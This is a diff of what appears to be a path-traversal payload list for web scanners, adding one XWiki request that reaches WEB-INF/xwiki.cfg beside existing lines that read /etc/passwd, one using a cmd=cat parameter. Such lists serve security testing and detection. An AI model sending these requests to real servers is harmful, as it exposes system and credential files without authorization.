@@ -868,3 +868,4 @@
 /view/theme/redbasic/php/style.pcss?f=&puid=2&schema=../../../../shell&v=7.1.6&cmd=cat%20/etc/passwd
 /ViewSource/?file=de/robv/android/xposed/installer/repo/RepoDb.java&md5=36570c6fac687ffe08107e6a72bd3da7/../../../../../../../../../../../private/etc/passwd%00&type=apk
 /cities?country=/../../../../../../../../etc/passwd
+/xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg
